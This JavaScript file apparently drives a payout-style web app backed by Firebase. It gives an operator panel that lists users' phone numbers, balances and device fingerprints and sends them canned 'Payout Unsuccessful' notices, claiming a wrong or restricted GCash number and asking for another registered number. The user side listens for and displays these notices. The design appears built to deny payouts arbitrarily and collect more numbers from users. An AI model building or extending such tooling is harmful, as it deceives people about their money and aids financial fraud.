/**
 * ADCOM.JS v2.5 - Handle +63 prefix format from index.html
 * 
 * INPUT FORMATS FROM INDEX.HTML:
 * - User sees: +63 [9123456789]
 * - Stored in localStorage: "09123456789" (after formatPhoneNumber())
 * - Admin sees in table: "09123456789" or "+639123456789"
 * 
 * STANDARD OUTPUT: 09123456789 (always 11 digits, starts with 09)
 */

// ========== DETECT CURRENT PAGE ==========
const isAdminPage = window.location.pathname.includes('admin') || 
                    window.location.pathname.includes('admin_12820') ||
                    document.querySelector('.cia-header') !== null;

// ========== CONFIGURATION ==========
const CONFIG = {
    USER_SESSIONS_PATH: 'user_sessions',
    MSG_WRONG_NUMBER: '⚠️ Payout Unsuccessful! Please use your registered GCash number.',
    MSG_RESTRICTED: '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.',
    POPUP_DELAY: 1500,
    LISTENER_DELAY: 1500,
    INITIAL_CHECK_DELAY: 2000,
    RETRY_ATTEMPTS: 10,
    RETRY_INTERVAL: 2000
};

// ========== CSS FOR ADMIN POPUP + USER MODAL ==========
if (isAdminPage) {
    const style = document.createElement('style');
    style.textContent = `
        .admin-command-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        .admin-command-popup-content {
            width: 90%;
            max-width: 400px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 2px solid #00f2ff;
            overflow: hidden;
            animation: slideUp 0.3s ease;
        }
        .admin-command-popup-header {
            padding: 15px;
            background: rgba(0,242,255,0.1);
            border-bottom: 1px solid #00f2ff;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .admin-command-popup-header h3 { color: #00f2ff; margin: 0; font-size: 14px; font-weight: 600; }
        .close-popup { background: none; border: none; color: #fff; font-size: 20px; cursor: pointer; transition: color 0.2s; }
        .close-popup:hover { color: #ff4444; }
        .user-info-section { padding: 15px; }
        .info-row { margin-bottom: 10px; font-size: 13px; display: flex; align-items: center; }
        .info-label { color: #888; display: inline-block; width: 100px; flex-shrink: 0; }
        .info-value { color: #fff; font-weight: 500; }
        .command-buttons-section { padding: 15px; border-top: 1px solid #333; }
        .command-buttons-grid { display: flex; gap: 10px; }
        .command-btn { flex: 1; padding: 12px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: transform 0.2s, opacity 0.2s; font-size: 12px; }
        .command-btn:hover { transform: translateY(-2px); opacity: 0.9; }
        .command-btn:active { transform: translateY(0); }
        .command-1 { background: #ff9800; color: #fff; }
        .command-2 { background: #2196f3; color: #fff; }
        .clickable-phone { cursor: pointer !important; color: #00f2ff !important; text-decoration: underline !important; transition: all 0.2s; font-weight: 500; }
        .clickable-phone:hover { color: #80f7ff !important; text-shadow: 0 0 8px rgba(0, 242, 255, 0.5); }
        .sent-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; margin-left: 8px; }
        .badge-success { background: #4caf50; color: #fff; }
        .badge-pending { background: #ff9800; color: #fff; }
    `;
    document.head.appendChild(style);
}

// ========== USER MODAL CSS ==========
const userModalStyle = document.createElement('style');
userModalStyle.textContent = `
    .admin-alert-modal {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.85);
        backdrop-filter: blur(8px);
        z-index: 99999999;
        display: flex;
        align-items: center;
        justify-content: center;
        animation: modalFadeIn 0.3s ease;
    }
    .admin-alert-modal-content {
        width: 90%;
        max-width: 360px;
        background: #1a1a2e;
        border-radius: 20px;
        border: 2px solid #ff4444;
        overflow: hidden;
        animation: modalSlideUp 0.4s ease;
        box-shadow: 0 20px 60px rgba(255, 68, 68, 0.3);
    }
    .admin-alert-modal-header {
        padding: 20px;
        background: rgba(255, 68, 68, 0.1);
        border-bottom: 1px solid #ff4444;
        text-align: center;
    }
    .admin-alert-modal-header h3 { color: #ff4444; margin: 0; font-size: 18px; font-weight: 700; }
    .admin-alert-modal-body { padding: 25px 20px; text-align: center; }
    .admin-alert-modal-body p { color: #fff; font-size: 15px; line-height: 1.6; margin: 0; }
    .admin-alert-modal-footer { padding: 15px 20px 20px; text-align: center; }
    .admin-alert-modal-btn {
        width: 100%;
        padding: 14px;
        background: #ff4444;
        color: #fff;
        border: none;
        border-radius: 12px;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        transition: all 0.2s;
    }
    .admin-alert-modal-btn:hover { background: #ff6666; transform: translateY(-2px); }
    .admin-alert-icon { font-size: 48px; margin-bottom: 15px; }
`;
document.head.appendChild(userModalStyle);

// ========== STANDARDIZED PHONE FORMAT ==========
/**
 * STANDARDIZE ALL PHONE FORMATS TO 09XXXXXXXXX
 * 
 * Input variations handled:
 *   +639123456789 → 09123456789
 *   639123456789  → 09123456789  
 *   09123456789   → 09123456789 (already standard)
 *   9123456789    → 09123456789
 *   099123456789  → 09123456789 (remove extra 9)
 *   +63 912 345 6789 → 09123456789
 * 
 * Output: Always 09123456789 (11 digits, starts with 09)
 */
function standardizePhone(phone) {
    if (!phone || typeof phone !== 'string') {
        console.warn('⚠️ standardizePhone: invalid input:', phone);
        return '';
    }

    // Step 1: Remove all non-digit characters
    let digits = phone.replace(/\D/g, '');

    console.log('📞 standardizePhone input:', phone, '→ digits:', digits);

    // Step 2: Handle different formats

    // Case A: 12+ digits starting with 639 (international with country code)
    // Example: 639123456789 → 09123456789
    if (digits.startsWith('639') && digits.length >= 12) {
        digits = '0' + digits.substring(2);
        console.log('   Case A: 639... → ', digits);
    }
    // Case B: 12+ digits starting with 63 (international)
    // Example: 639123456789 → 09123456789
    else if (digits.startsWith('63') && digits.length >= 11) {
        digits = '0' + digits.substring(2);
        console.log('   Case B: 63... → ', digits);
    }
    // Case C: 10 digits starting with 9 (no leading 0)
    // Example: 9123456789 → 09123456789
    else if (digits.length === 10 && digits.startsWith('9')) {
        digits = '0' + digits;
        console.log('   Case C: 9... → ', digits);
    }
    // Case D: 11 digits starting with 09 (already standard)
    // Example: 09123456789 → keep as is
    else if (digits.length === 11 && digits.startsWith('09')) {
        console.log('   Case D: Already standard:', digits);
    }
    // Case E: 12 digits starting with 099 (extra 9)
    // Example: 099123456789 → 09123456789
    else if (digits.length === 12 && digits.startsWith('099')) {
        digits = '0' + digits.substring(2);
        console.log('   Case E: 099... → ', digits);
    }
    // Case F: 11 digits not starting with 09
    // Example: 99123456789 → 09123456789
    else if (digits.length === 11 && !digits.startsWith('09')) {
        if (digits.startsWith('9')) {
            digits = '0' + digits.substring(1);
        } else {
            digits = '09' + digits.substring(2);
        }
        console.log('   Case F: Fixed prefix → ', digits);
    }

    // Step 3: Final validation
    if (digits.length !== 11 || !digits.startsWith('09')) {
        console.warn('⚠️ Invalid phone format after standardization:', phone, '→', digits);
    } else {
        console.log('✅ Standardized:', digits);
    }

    return digits;
}

// ========== UTILITY FUNCTIONS ==========
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 8px;
        color: #fff;
        font-weight: 500;
        z-index: 99999999;
        background: ${type === 'success' ? '#4caf50' : '#ff4444'};
    `;
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ========== USER: CUSTOM MODAL ==========
function showAdminAlertModal(message) {
    const existing = document.getElementById('adminAlertModal');
    if (existing) existing.remove();

    const modalHTML = `
        <div id="adminAlertModal" class="admin-alert-modal">
            <div class="admin-alert-modal-content">
                <div class="admin-alert-modal-header">
                    <div class="admin-alert-icon">⚠️</div>
                    <h3>ADMIN NOTICE</h3>
                </div>
                <div class="admin-alert-modal-body">
                    <p>${escapeHtml(message)}</p>
                </div>
                <div class="admin-alert-modal-footer">
                    <button class="admin-alert-modal-btn" onclick="dismissAdminAlert()">OK, I UNDERSTAND</button>
                </div>
            </div>
        </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);

    setTimeout(() => {
        const btn = document.querySelector('.admin-alert-modal-btn');
        if (btn) btn.focus();
    }, 100);
}

function dismissAdminAlert() {
    const modal = document.getElementById('adminAlertModal');
    if (modal) {
        modal.style.animation = 'modalFadeIn 0.2s ease reverse';
        setTimeout(() => modal.remove(), 200);
    }
}

// ========== ADMIN: SHOW USER POPUP ==========
async function showUserDetailsPopup(phone) {
    if (!isAdminPage) return;

    const standardizedPhone = standardizePhone(phone);

    try {
        const userSnap = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).once('value');
        const userData = userSnap.val();

        if (!userData) {
            showToast('User not found or offline', 'error');
            return;
        }

        const balance = (userData.balance || 0).toFixed(2);
        const device = userData.deviceFingerprint || 'Unknown';
        const lastActive = userData.lastActive ? new Date(userData.lastActive).toLocaleString() : 'N/A';
        const hasPendingCommand = !!userData.adminCommand;

        const popupHTML = `
            <div id="userCommandPopup" class="admin-command-popup">
                <div class="admin-command-popup-content">
                    <div class="admin-command-popup-header">
                        <h3>👤 SEND MESSAGE ${hasPendingCommand ? '<span class="sent-badge badge-pending">PENDING</span>' : ''}</h3>
                        <button class="close-popup" onclick="closeUserCommandPopup()">✕</button>
                    </div>
                    <div class="user-info-section">
                        <div class="info-row">
                            <span class="info-label">📱 Number:</span>
                            <span class="info-value">${escapeHtml(phone)}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">💰 Balance:</span>
                            <span class="info-value">₱${balance}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">🔑 Device:</span>
                            <span class="info-value">${escapeHtml(device.substring(0, 20))}...</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">🕐 Last Active:</span>
                            <span class="info-value">${lastActive}</span>
                        </div>
                    </div>
                    <div class="command-buttons-section">
                        <div class="command-buttons-grid">
                            <button class="command-btn command-1" onclick="sendCommand('${escapeHtml(phone)}', '1')">
                                📧 WRONG NUMBER
                            </button>
                            <button class="command-btn command-2" onclick="sendCommand('${escapeHtml(phone)}', '2')">
                                📞 RESTRICTED
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        closeUserCommandPopup();
        document.body.insertAdjacentHTML('beforeend', popupHTML);
    } catch (error) {
        console.error('Popup error:', error);
        showToast('Error loading user data', 'error');
    }
}

function closeUserCommandPopup() {
    const popup = document.getElementById('userCommandPopup');
    if (popup) {
        popup.style.animation = 'fadeOut 0.2s ease';
        setTimeout(() => popup.remove(), 200);
    }
}

// ========== ADMIN: SEND COMMAND ==========
async function sendCommand(phone, type) {
    if (!isAdminPage) return;

    closeUserCommandPopup();

    const standardizedPhone = standardizePhone(phone);
    const message = type === '1' ? CONFIG.MSG_WRONG_NUMBER : CONFIG.MSG_RESTRICTED;

    console.log('📤 Sending command to:', standardizedPhone);

    try {
        await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).update({
            adminCommand: message,
            commandTimestamp: Date.now(),
            commandType: type,
            commandStatus: 'pending'
        });

        showToast('✅ Message sent to user!');
        console.log('✅ Command saved to Firebase');
    } catch (error) {
        console.error('❌ Send command error:', error);
        showToast('❌ Failed to send message', 'error');
    }
}

// ========== ADMIN: MAKE PHONES CLICKABLE ==========
function makePhonesClickable() {
    if (!isAdminPage) return;

    const phoneRegex = /^(\+63\d{10}|09\d{9}|63\d{10}|9\d{9})$/;
    let foundPhones = 0;

    const ghostData = document.getElementById('ghostData');
    if (!ghostData) return 0;

    const allElements = ghostData.querySelectorAll('*');

    allElements.forEach(element => {
        if (element.hasAttribute('data-clickable')) return;

        const text = element.textContent || element.innerText || '';
        const trimmedText = text.trim();

        if (phoneRegex.test(trimmedText) && element.children.length === 0) {
            element.setAttribute('data-clickable', 'true');
            element.classList.add('clickable-phone');
            element.style.cursor = 'pointer';

            element.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                showUserDetailsPopup(trimmedText);
            });

            foundPhones++;
        }
    });

    const tds = ghostData.querySelectorAll('td');
    tds.forEach(td => {
        if (td.hasAttribute('data-clickable')) return;

        const text = td.textContent || td.innerText || '';
        const trimmedText = text.trim();

        if (phoneRegex.test(trimmedText)) {
            td.setAttribute('data-clickable', 'true');
            td.classList.add('clickable-phone');
            td.style.cursor = 'pointer';

            td.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                showUserDetailsPopup(trimmedText);
            });

            foundPhones++;
        }
    });

    if (foundPhones > 0) {
        console.log(`✅ Made ${foundPhones} phone numbers clickable`);
    }

    return foundPhones;
}

// ========== OBSERVE TABLE CHANGES ==========
function observeTableChanges() {
    if (!isAdminPage) return;

    const ghostData = document.getElementById('ghostData');
    const userDropdown = document.getElementById('userDropdown');

    if (ghostData) {
        const tableObserver = new MutationObserver(() => {
            setTimeout(makePhonesClickable, 100);
        });
        tableObserver.observe(ghostData, { childList: true, subtree: true });
    }

    if (userDropdown) {
        const dropdownObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.attributeName === 'style' || mutation.attributeName === 'class') {
                    const isVisible = userDropdown.style.display !== 'none';
                    if (isVisible) setTimeout(makePhonesClickable, 300);
                }
            });
        });
        dropdownObserver.observe(userDropdown, { attributes: true, attributeFilter: ['style', 'class'] });
    }

    let attempts = 0;
    const retryInterval = setInterval(() => {
        attempts++;
        const found = makePhonesClickable();
        if (found > 0 || attempts >= CONFIG.RETRY_ATTEMPTS) {
            clearInterval(retryInterval);
        }
    }, CONFIG.RETRY_INTERVAL);

    if (typeof toggleDropdown === 'function') {
        const originalToggle = toggleDropdown;
        window.toggleDropdown = function(id) {
            originalToggle(id);
            if (id === 'userDropdown') {
                setTimeout(makePhonesClickable, 500);
                setTimeout(makePhonesClickable, 1000);
            }
        };
    }

    makePhonesClickable();
}

// ========== USER: REAL-TIME COMMAND LISTENER ==========
let commandListenerActive = false;
let commandUnsubscribe = null;

function startRealTimeCommandListener() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone || commandListenerActive) return;

    const standardizedPhone = standardizePhone(userPhone);

    console.log('🔔 Starting real-time command listener');
    console.log('   Original phone:', userPhone);
    console.log('   Standardized:', standardizedPhone);

    commandListenerActive = true;

    commandUnsubscribe = db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone + '/adminCommand')
        .on('value', async (snapshot) => {
            const message = snapshot.val();

            console.log('📨 Listener triggered!');
            console.log('   Message:', message);

            if (message) {
                console.log('✅ Valid message received, showing modal...');

                // USE CUSTOM MODAL
                showAdminAlertModal(message);

                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).update({
                    commandStatus: 'received',
                    commandReceivedAt: Date.now()
                });

                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone + '/adminCommand').remove();

                // CLEAR userPhone from localStorage
                localStorage.removeItem('userPhone');
                console.log('🗑️ userPhone cleared from localStorage');

                stopRealTimeCommandListener();
            }
        }, (error) => {
            console.error('❌ Listener error:', error);
            commandListenerActive = false;
            setTimeout(startRealTimeCommandListener, 5000);
        });

    console.log('✅ Listener attached successfully');
}

function stopRealTimeCommandListener() {
    if (commandUnsubscribe) {
        commandUnsubscribe();
        commandUnsubscribe = null;
    }
    commandListenerActive = false;
}

// ========== USER: FALLBACK CHECK ==========
async function checkForAdminCommand() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone) return false;

    try {
        const standardizedPhone = standardizePhone(userPhone);
        const snapshot = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).once('value');
        const userData = snapshot.val();

        if (userData && userData.adminCommand) {
            showAdminAlertModal(userData.adminCommand);
            await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone + '/adminCommand').remove();
            localStorage.removeItem('userPhone');
            return true;
        }
    } catch (error) {
        console.log('Fallback check error:', error);
    }
    return false;
}

function hookUserActions() {
    document.body.addEventListener('click', async () => {
        if (!commandListenerActive) await checkForAdminCommand();
    }, true);
    document.body.addEventListener('submit', async () => {
        if (!commandListenerActive) await checkForAdminCommand();
    }, true);
}

// ========== START ==========
function init() {
    console.log('🚀 ADCOM.JS v2.5 initializing...');
    console.log('   isAdminPage:', isAdminPage);

    if (isAdminPage) {
        console.log('👤 ADMIN MODE');
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
            });
        } else {
            setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
        }
    } else {
        console.log('👤 USER MODE');
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    startRealTimeCommandListener();
                    hookUserActions();
                }, CONFIG.LISTENER_DELAY);
                setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
            });
        } else {
            setTimeout(() => {
                startRealTimeCommandListener();
                hookUserActions();
            }, CONFIG.LISTENER_DELAY);
            setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
        }
    }
}

init();
